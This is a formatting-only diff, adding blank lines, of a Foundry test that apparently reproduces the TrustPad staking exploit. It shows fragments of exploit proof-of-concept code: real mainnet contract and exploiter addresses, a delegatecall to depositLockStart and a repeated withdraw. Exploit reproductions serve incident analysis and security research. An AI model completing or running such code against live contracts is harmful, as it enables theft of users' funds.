@@ -19,6 +19,7 @@ import "./../interface.sol";
 // Exploiter repeated the following process multiple times
 
 interface ILaunchpadLockableStaking {
+
     function receiveUpPool(address account, uint256 amount) external;
 
     function withdraw(uint256 amount) external;
@@ -37,9 +38,11 @@ interface ILaunchpadLockableStaking {
     function lockPeriod() external view returns (uint256);
 
     function stakePendingRewards() external;
+
 }
 
 contract ContractTest is Test {
+
     ILaunchpadLockableStaking private constant LaunchpadLockableStaking =
         ILaunchpadLockableStaking(0xE613c058701C768E0d04D1bf8e6a6dc1a0C6d48A);
     IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
@@ -119,9 +122,11 @@ contract ContractTest is Test {
             address(helperContract).delegatecall(abi.encodeWithSignature("depositLockStart(address)", addr));
         require(success, "Delegatecall to depositLockStart failed");
     }
+
 }
 
 contract HelperContract is Test {
+
     IERC20 private constant DDD = IERC20(0x2e1FC745937a44ae8313bC889EE023ee303F2488);
     IERC20 private constant TPAD = IERC20(0xADCFC6bf853a0a8ad7f9Ff4244140D10cf01363C);
     address private constant TrustPadProtocolExploiter = 0x1a7b15354e2F6564fcf6960c79542DE251cE0dC9;
@@ -177,4 +182,5 @@ contract HelperContract is Test {
         }
         LaunchpadLockableStaking.withdraw(amountToWithdraw);
     }
+
 }
